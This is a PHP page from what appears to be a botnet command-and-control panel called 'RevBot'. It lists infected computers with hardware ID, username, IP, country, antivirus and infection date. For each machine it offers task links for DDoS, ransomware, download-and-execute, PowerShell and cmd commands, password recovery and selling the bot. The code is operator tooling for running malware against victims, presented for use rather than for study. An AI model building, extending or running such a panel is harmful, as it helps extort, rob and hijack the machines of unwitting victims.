<?php
if (!$user->CheckLogin()) {
    $page = $tpl->GetPage("login");
    require_once $page;
    die();
}
$curr_user = $user->GetData($_SESSION['TOKEN']);
?>
<!DOCTYPE html>
<html lang="en" data-menu="vertical" data-nav-size="nav-default">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RevBot | Bots</title>

    <link rel="shortcut icon" href="favicon.png">
    <link rel="stylesheet" href="assets/vendor/css/all.min.css">
    <link rel="stylesheet" href="assets/vendor/css/sharp-solid.min.css">
    <link rel="stylesheet" href="assets/vendor/css/sharp-regular.min.css">
    <link rel="stylesheet" href="assets/vendor/css/jquery-ui.min.css">
    <link rel="stylesheet" href="assets/vendor/css/OverlayScrollbars.min.css">
    <link rel="stylesheet" href="assets/vendor/css/jquery.dataTables.min.css">
    <link rel="stylesheet" href="assets/vendor/css/select2.min.css">
    <link rel="stylesheet" href="assets/vendor/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" id="primaryColor" href="assets/css/blue-color.css">
    <link rel="stylesheet" id="rtlStyle" href="table.html#">
    <style>
        .alert {
            position: relative;
            top: 10;
            left: 0;
            width: auto;
            height: auto;
            padding: 10px;
            margin: 10px;
            line-height: 1.8;
            border-radius: 5px;
            cursor: hand;
            cursor: pointer;
            font-family: sans-serif;
            font-weight: 400;
        }

        .alertCheckbox {
            display: none;
        }

        :checked+.alert {
            display: none;
        }

        .alertText {
            display: table;
            margin: 0 auto;
            text-align: center;
            font-size: 16px;
        }

        .alertClose {
            float: right;
            padding-top: 5px;
            font-size: 10px;
        }

        .clear {
            clear: both;
        }

        .info {
            background-color: #EEE;
            border: 1px solid #DDD;
            color: #999;
        }

        .success {
            background-color: #EFE;
            border: 1px solid #DED;
            color: #9A9;
        }

        .notice {
            background-color: #EFF;
            border: 1px solid #DEE;
            color: #9AA;
        }

        .warning {
            background-color: #FDF7DF;
            border: 1px solid #FEEC6F;
            color: #C9971C;
        }

        .error {
            background-color: #FEE;
            border: 1px solid #EDD;
            color: #A66;
        }
    </style>
</head>

<body class="body-padding body-p-top">
    <!-- preloader start -->
    <div class="preloader d-none">
        <div class="loader">
            <span></span>
            <span></span>
            <span></span>
        </div>
    </div>
    <!-- preloader end -->
    <?php include $lz_path['imports'] . "/navbar.php"; ?>


    <!-- main content start -->
    <div class="main-content">


        <div class="col-12">
            <div class="card">
                <div class="card-header">
                    Bots
                </div>
                <div class="card-body">
                    <table class="table table-bordered table-dashed table-hover digi-dataTable dataTable-resize table-striped" id="componentDataTable3">
                        <thead>
                            <tr>

                                
                                <th><span class="resize-col">ACTION</span></th>
                                <th><span class="resize-col">ID</span></th>
                                <th><span class="resize-col">HWIID</span></th>
                                <th><span class="resize-col">PCNAME</span></th>
                                <th><span class="resize-col">PCNAME</span></th>
                                <th><span class="resize-col">COUNTRY</span></th>
                                <th><span class="resize-col">IP</span></th>
                                <th><span class="resize-col">BUSY</span></th>
                                <th><span class="resize-col">STATUS</span></th>
                                <th><span class="resize-col">LASTREQUEST</span></th>
                                <th><span class="resize-col">ONLINE</span></th>
                                <th><span class="resize-col">ANTI VIRUS</span></th>
                                <th><span class="resize-col">INFECTED DATE</span></th>
                                <th><span class="resize-col">REQUEST</span></th>
                            </tr>
                        </thead>
                        <tbody>
                   


                                <?php
                                $paramsearch = array();
                                $paramsearch['USER_TOEKN'] = $_SESSION['TOKEN'];
                                $botlist = $bots->BotList($paramsearch);
                                
                                foreach($botlist as $bot) {
       
                                    echo '
                                                
                            <tr>

                                    <td>
                                    <div class="digi-dropdown dropdown d-inline-block">
                                        <button class="btn btn-sm btn-outline-primary" data-bs-toggle="dropdown" aria-expanded="false">Action <i class="fa-regular fa-angle-down"></i></button>
                                        <ul class="digi-dropdown-menu dropdown-menu dropdown-slim dropdown-menu-sm">
                                            <li><a href="./?p=bot_view&bot='.$bot['TOKEN'].'" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-eye"></i></span> View</a></li>
                                            <li><a href="./?p=bot_setgroup&bot='.$bot['TOKEN'].'"&type=setgroup class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-pen-nib"></i></span> Set Group</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=reboot" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-pen-to-square"></i></span> Reboot</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=shutdown" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-id-card"></i></span> Shutdown</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=ddos" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-pen-nib"></i></span> DDOS</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=ransomware" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-pen-nib"></i></span> Ransomware</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=dlexec" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-pen-nib"></i></span> Download/Execute</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=powershell" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-pen-nib"></i></span> Powershell</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=cmd" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-pen-nib"></i></span> cmd</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=recovery" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-pen-nib"></i></span> Password recovery</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=tchat" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-pen-nib"></i></span> Tchat</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=sell" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-pen-nib"></i></span> Vendre</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=close" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-arrow-right-from-bracket"></i></span> Close Malware</a></li>
                                            <li><a href="./?p=add_task&bot='.$bot['TOKEN'].'&type=uninstall" class="dropdown-item"><span class="dropdown-icon"><i class="fa-light fa-trash-can"></i></span> Uninstall</a></li>
                                        </ul>
                                    </div>
                                </td>
                                    ';
                                    echo "<td><span class='resize-col'>".$bot['ID']."</span></td>";
                                    echo "<td><span class='resize-col'>".$bot['HWID']."</span></td>";
                                    echo "<td><span class='resize-col'>".$bot['PCNAME']."</span></td>";
                                    echo "<td><span class='resize-col'>".$bot['USERNAME']."</span></td>";
                                    echo "<td><span class='resize-col'>".$bot['COUNTRY']."</span></td>";
                                    echo "<td><span class='resize-col'>".$bot['IP']."</span></td>";
                                    echo "<td><span class='resize-col'>".$bot['BUSY']."</span></td>";
                                    echo "<td><span class='resize-col'>".$bot['STATUS']."</span></td>";
                                    echo "<td><span class='resize-col'>".date("d/m/Y H\hi",$bot['LASTREQUEST'])."</span></td>";
                                    echo "<td><span class='resize-col'>".date("d/m/Y H\hi",$bot['ONLINE'])."</span></td>";
                                    echo "<td><span class='resize-col'>".$bot['ANTI_VIRUS']."</span></td>";
                                    echo "<td><span class='resize-col'>".date("d/m/Y H\hi'",$bot['INFECTED_DATE'])."</span></td>";
                                    echo "<td><span class='resize-col'>".$bot['XUSE']."</span></td>
                                                
                            </tr>";
                                }	

                                ?>
                 


                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>


    <!-- footer start -->
 
    <!-- footer end -->
    </div>
    <!-- main content end -->

    <script src="assets/vendor/js/jquery-3.6.0.min.js"></script>
    <script src="assets/vendor/js/jquery-ui.min.js"></script>
    <script src="assets/vendor/js/jquery.overlayScrollbars.min.js"></script>
    <script src="assets/vendor/js/jquery.dataTables.min.js"></script>
    <script src="assets/vendor/js/select2.min.js"></script>
    <script src="assets/vendor/js/bootstrap.bundle.min.js"></script>
    <script src="assets/js/main.js"></script>
    <script src="assets/js/select2-init.js"></script>
    <!-- for demo purpose -->
    <script>
        var rtlReady = $('html').attr('dir', 'ltr');
        if (rtlReady !== undefined) {
            localStorage.setItem('layoutDirection', 'ltr');
        }
    </script>
    <!-- for demo purpose -->
</body>

</html>